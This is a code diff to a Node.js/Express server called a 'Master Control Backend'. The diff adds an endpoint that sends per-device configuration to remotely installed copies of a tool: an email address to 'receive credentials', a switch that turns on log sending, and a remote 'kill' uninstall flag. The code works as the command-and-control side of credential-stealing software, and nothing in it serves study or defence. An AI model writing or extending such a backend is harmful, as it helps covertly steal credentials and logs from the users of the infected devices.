@@ -70,6 +70,20 @@ app.post('/api/update-config', (req, res) => {
 
 // Start server
 const PORT = process.env.PORT || 3000;
+
+// Add config endpoint for device control
+app.get("/api/configs/:deviceId", (req, res) => {
+  const { deviceId } = req.params;
+
+  const config = {
+    email: "your@email.com",   // Change this to the email you want to receive credentials
+    log: true,                 // true = send logs; false = disable
+    kill: false                // true = uninstall the tool remotely
+  };
+
+  res.json(config);
+});
+
 app.listen(PORT, () => {
   console.log(`Master Control Backend running on port ${PORT}`);
 });
